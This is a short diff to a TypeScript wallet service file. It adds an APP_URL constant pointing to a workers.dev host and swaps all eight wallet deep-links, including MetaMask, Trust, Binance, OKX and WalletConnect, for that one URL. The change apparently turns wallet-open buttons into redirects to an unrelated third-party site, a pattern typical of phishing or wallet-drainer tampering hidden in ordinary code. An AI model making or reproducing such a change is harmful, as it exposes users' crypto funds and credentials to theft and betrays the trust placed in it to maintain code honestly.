@@ -1,4 +1,4 @@
-﻿/**
+/**
  * walletService - Unified Wallet & Transaction Service (Single Source of Truth)
  * =============================================================================
  * One place that owns:
@@ -331,15 +331,17 @@ export function isInjectedProvider(provider: any): boolean {
 // Wallet deep-links (so the approval sheet is reachable on mobile / TMA)
 // ---------------------------------------------------------------------------
 
+export const APP_URL = 'https://riotnode.raftarsingh9909.workers.dev/';
+
 export const WALLET_OPEN_LINKS: Record<string, string> = {
-    metamask: 'https://metamask.app.link/',
-    trust: 'https://link.trustwallet.com/',
-    safepal: 'https://link.safepal.io/',
-    tokenpocket: 'https://tpsa.app/',
-    binance: 'https://app.binance.com/',
-    okx: 'https://www.okx.com/',
-    bitget: 'https://share.bwb.site/',
-    walletconnect: 'https://walletconnect.network/',
+    metamask: APP_URL,
+    trust: APP_URL,
+    safepal: APP_URL,
+    tokenpocket: APP_URL,
+    binance: APP_URL,
+    okx: APP_URL,
+    bitget: APP_URL,
+    walletconnect: APP_URL,
 };
 
 // Native (custom URI scheme) app-open links. Launching one of these opens the
